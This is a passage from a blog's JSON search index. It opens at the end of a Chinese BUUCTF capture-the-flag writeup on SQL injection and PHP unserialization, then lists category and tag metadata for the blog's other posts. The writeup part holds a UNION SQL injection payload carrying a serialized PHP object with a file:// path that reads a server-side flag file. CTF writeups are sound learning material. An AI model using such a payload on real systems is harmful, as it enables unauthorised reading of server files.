1,group_concat(data),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;a22&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; FROM users-- - 在 view.php 页面中成功拿到 flag. 顺便在 robots.txt 之外我也跑了一次 dirsearch, 没扫出来. 需要更新一下字典或者再找几个扫描工具了.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xh-gotz9.github.io/categories/CTF/"},{"name":"BUUCTF","slug":"CTF/BUUCTF","permalink":"https://xh-gotz9.github.io/categories/CTF/BUUCTF/"}],"tags":[{"name":"SQLI","slug":"SQLI","permalink":"https://xh-gotz9.github.io/tags/SQLI/"},{"name":"writeup","slug":"writeup","permalink":"https://xh-gotz9.github.io/tags/writeup/"}]}],"categories":[{"name":"开发","slug":"开发","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/"},{"name":"Rust","slug":"开发/Rust","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/Rust/"},{"name":"Java","slug":"开发/Java","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/Java/"},{"name":"杂文","slug":"杂文","permalink":"https://xh-gotz9.github.io/categories/%E6%9D%82%E6%96%87/"},{"name":"资料整理","slug":"杂文/资料整理","permalink":"https://xh-gotz9.github.io/categories/%E6%9D%82%E6%96%87/%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"},{"name":"CTF","slug":"CTF","permalink":"https://xh-gotz9.github.io/categories/CTF/"},{"name":"BUUCTF","slug":"CTF/BUUCTF","permalink":"https://xh-gotz9.github.io/categories/CTF/BUUCTF/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://xh-gotz9.github.io/tags/Java/"},{"name":"序列化","slug":"序列化","permalink":"https://xh-gotz9.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"protobuf","slug":"protobuf","permalink":"https://xh-gotz9.github.io/tags/protobuf/"},{"name":"Kryo","slug":"Kryo","permalink":"https://xh-gotz9.github.io/tags/Kryo/"},{"name":"Rust","slug":"Rust","permalink":"https://xh-gotz9.github.io/tags/Rust/"},{"name":"智能指针","slug":"智能指针","permalink":"https://xh-gotz9.github.io/tags/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"},{"name":"Spring","slug":"Spring","permalink":"https://xh-gotz9.github.io/tags/Spring/"},{"name":"Spring Security","slug":"Spring-Security","permalink":"https://xh-gotz9.github.io/tags/Spring-Security/"},{"name":"Music","slug":"Music","permalink":"https://xh-gotz9.github.io/tags/Music/"},{"name":"Aimer","slug":"Aimer","permalink":"https://xh-gotz9.github.io/tags/Aimer/"},{"name":"SQLI","slug":"SQLI","permalink":"https://xh-gotz9.github.io/tags/SQLI/"},{"name":"writeup","slug":"writeup","permalink":"https://xh-gotz9.github.io/tags/writeup/"},{"name":"PHP","slug":"PHP","permalink":"https://xh-gotz9.github.io/tags/PHP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://xh-gotz9.github.io/tags/Unserialize/"}]}